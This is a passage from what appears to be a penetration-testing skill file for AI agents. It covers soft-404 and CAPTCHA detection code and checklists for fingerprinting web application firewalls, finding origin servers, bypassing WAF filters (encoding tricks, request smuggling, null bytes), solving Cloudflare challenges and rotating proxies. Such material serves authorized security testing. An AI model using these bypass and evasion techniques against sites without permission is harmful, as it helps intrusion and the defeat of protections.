                ratio_to_200 = len(response.text) / self.baseline_200['length']
                if ratio_to_200 < 0.3:
                    return True
        
        return False
    
    def _extract_title(self, html):
        """Extract page title from HTML."""
        import re
        match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        return match.group(1).strip() if match else None

# Usage
detector = Soft404Detector('https://target.com')
detector.setup_baselines()

# Test a path
resp = requests.get('https://target.com/some-path')
if detector.is_soft_404(resp):
    print(f"Soft 404 detected: {resp.url}")
else:
    print(f"Valid page: {resp.url}")
```

### CAPTCHA Detection

```python
def is_captcha_page(html):
    """Determine if a page is showing a CAPTCHA challenge."""
    captcha_patterns = [
        # Cloudflare
        'cf-captcha-container',
        'id="captcha-box"',
        'challenge-form',
        'turnstile',
        
        # reCAPTCHA
        'g-recaptcha',
        'recaptcha/api',
        'data-sitekey',
        'google.com/recaptcha',
        
        # hCaptcha
        'h-captcha',
        'hcaptcha.com',
        'data-hcaptcha-widget-id',
        
        # Imperva
        '__incapsula_verify',
        'bot verification',
        
        # Generic
        'captcha',
        'verify your identity',
        'security check',
        'complete the security',
        'are you human',
        'prove you are human',
        'verify you are human',
        'automated access',
    ]
    
    html_lower = html.lower()
    matches = []
    
    for pattern in captcha_patterns:
        if pattern.lower() in html_lower:
            matches.append(pattern)
    
    return matches
```

---

## Checklist

### WAF Identification Checklist

- [ ] Check response headers for CDN/WAF signatures (CF-Ray, X-Served-By, X-Cache, etc.)
- [ ] Check `Server` header for WAF overrides (cloudflare, AkamaiGHost, etc.)
- [ ] Analyze response status codes for pattern anomalies (403, 406, 503)
- [ ] Inspect response body for WAF challenge pages and block templates
- [ ] Measure timing differences between clean and malicious requests
- [ ] Extract and analyze cookies (cf_clearance, ak_bmsc, incap_ses, etc.)
- [ ] Run wafw00f against the target
- [ ] Compare responses with and without known attack payloads
- [ ] Check error pages for error codes (Cloudflare 1020, ModSecurity error IDs)
- [ ] Identify WAF datacenter location from headers (CF-Ray pop code, CloudFront POP)
- [ ] Test multiple subdomains — some may lack WAF protection
- [ ] Test different HTTP methods — WAF may not inspect all methods equally

### WAF Fingerprinting Checklist

- [ ] **Cloudflare**: CF-Ray header, Server: cloudflare, 1020 errors, JS challenge pages
- [ ] **AWS WAF/CloudFront**: X-Cache header, x-amz-cf-id, X-Amz-Cf-Pop, RequestBlocked messages
- [ ] **Akamai**: X-Akamai-Transformed header, ak_bmsc/_abck cookies, AkamaiGHost server
- [ ] **F5 BigIP ASM**: X-ASM-Policy header, support IDs, "The requested URL was rejected"
- [ ] **Imperva/Incapsula**: X-CDN: Incapsula, incap_ses/visid_incap cookies, bot verification
- [ ] **ModSecurity**: X-Mod-Security header, 406 Not Acceptable responses
- [ ] **Sucuri**: X-Sucuri-ID header, sucuri_cloudproxy cookie
- [ ] **Wordfence**: wfwaf-authcookie, WordPress-specific 403 blocks
- [ ] **Fastly**: X-Served-By, X-Cache: HIT/MISS, X-Timer headers
- [ ] **StackPath**: X-Proxy: stackpath, Server: stackpath

### Origin Discovery Checklist

- [ ] Examine CNAME record for CDN endpoint patterns
- [ ] Query certificate transparency logs (crt.sh, certspotter)
- [ ] Search historical DNS records (SecurityTrails, PassiveTotal)
- [ ] Compute and search favicon hash on Shodan/Censys
- [ ] Check HTTP response headers for server info leaks (Server, X-Powered-By)
- [ ] Test RSS/Atom feed URLs for origin IP exposure
- [ ] Inspect email headers from password reset/notification emails
- [ ] Run CloudFlair and similar origin-discovery tools
- [ ] Search Shodan/Censys for SSL certificate subject matches
- [ ] Google dork for origin IP (error messages, pastebin, monitoring dashboards)
- [ ] Brute force subdomains — many resolve directly to origin
- [ ] Compare TLS certificates between CDN domain and candidate IPs
- [ ] Check for X-Forwarded-For/Origin header reflection in responses
- [ ] Test direct IP access with correct Host header
- [ ] Search for leaked internal IPs in JS bundles

### Bypass Technique Checklist

- [ ] **HTTP method conversion**: Try GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS
- [ ] **Parameter pollution**: Duplicate params, different delimiters
- [ ] **Double URL encoding**: %2527 instead of %27 (', %253E instead of %3E (>))
- [ ] **UTF-16 encoding**: %00%31%00%27 for 1'
- [ ] **Unicode normalization**: Cyrillic homoglyphs, ideographic spaces
- [ ] **Case variation**: SeLeCt, <ScRiPt>, ONLOAD
- [ ] **Header manipulation**: X-Forwarded-For, X-Real-IP, X-Originating-IP
- [ ] **HTTP version downgrade**: HTTP/2 → HTTP/1.1 → HTTP/1.0
- [ ] **Protocol smuggling**: CL.TE, TE.CL, H2.CL
- [ ] **Chunked body variations**: Different Transfer-Encoding values
- [ ] **Comment injection**: /*!*/ in SQL, <!--> in HTML
- [ ] **Null byte injection**: %00 in payloads
- [ ] **Unicode escapes**: \u0027 for ', \u003C for <
- [ ] **Mixed encoding**: Combine multiple encoding techniques
- [ ] **Content-Type switching**: text/xml instead of text/html, multipart instead of form
- [ ] **Protocol downgrade**: HTTPS → HTTP (if available)
- [ ] **Parameter name mutation**: camelCase vs snake_case, different casing
- [ ] **Body encoding**: JSON vs form-urlencoded vs multipart vs XML

### Bypass Validation Checklist

- [ ] Compare response headers with baseline (clean request)
- [ ] Compare response body with baseline (should match clean, not blocked)
- [ ] Check timing: origin processing takes longer than WAF rejection
- [ ] Verify missing WAF-specific headers (CF-Ray absent = origin hit)
- [ ] Check for application-specific content (JSON, HTML, error messages)
- [ ] Confirm no WAF block signatures in response body
- [ ] Validate with multiple identical requests (consistency check)
- [ ] Test the same bypass on multiple WAF-protected endpoints
- [ ] Verify the bypass allows actual exploitation (not just response difference)
- [ ] Document the exact bypass technique that worked, including curl command

### Cloudflare-Specific Checklist

- [ ] Extract cf_clearance cookie via browser automation
- [ ] Configure CloudScraper with correct browser fingerprint
- [ ] Implement session persistence for cookie reuse
- [ ] Test request pacing to avoid rate limits
- [ ] Identify triggered WAF rule IDs (1020 errors)
- [ ] Solve JS challenges with headless browser
- [ ] Rotate user-agents and TCP fingerprints
- [ ] Use residential proxies for origin discovery
- [ ] Check for Cloudflare Workers that may add/modify WAF rules

### Rate Limiting & Proxy Checklist

- [ ] Implement adaptive backoff (exponential + jitter)
- [ ] Rotate user-agents every N requests
- [ ] Rotate IPs via proxy rotation
- [ ] Detect and handle 429/503 rate limit responses
- [ ] Warm up new IPs with gradual request rate
- [ ] Maintain cookie persistence across proxy rotations
- [ ] Use residential proxies for Cloudflare targets
- [ ] Integrate Tor for non-sensitive reconnaissance
- [ ] Monitor response patterns for rate limit indicators
- [ ] Implement burst detection and cooldown periods

### Reporting

- [ ] Document the identified WAF (vendor, version if detectable)
- [ ] Include WAF fingerprinting evidence (headers, cookies, block pages)
- [ ] Document the bypass technique with full curl command
- [ ] Include response comparison (blocked vs bypassed) as proof
- [ ] Note the origin discovery method (CT logs, Shodan, DNS history)
- [ ] Provide the origin IP or alternative access path
- [ ] Document any rate limit thresholds discovered
- [ ] Include tool commands and output for reproducibility
- [ ] Reference specific WAF rule IDs that were bypassed (if identifiable)
- [ ] Run through the 7-Question Gate (see `triage-validation` skill)

---

## Reference

- [wafw00f Documentation](https://github.com/EnableSecurity/wafw00f)
- [CloudScraper Documentation](https://github.com/VeNoMouS/cloudscraper)
- [Cloudflare WAF Managed Rules](https://developers.cloudflare.com/waf/managed-rules/reference/)
- [OWASP WAF Bypass Techniques](https://owasp.org/www-community/Web_Application_Firewall)
- [PortSwigger Research on HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [ModSecurity OWASP CRS Rule IDs](https://coreruleset.org/docs/configuring/crs_security/)
- [F5 ASM Reference Guide](https://techdocs.f5.com/kb/en-us/products/big-ip_asm/manuals.html)
- See also: `agents/windows-workflow-agent.md`, `agents/recon-agent.md`, `security-arsenal` skill
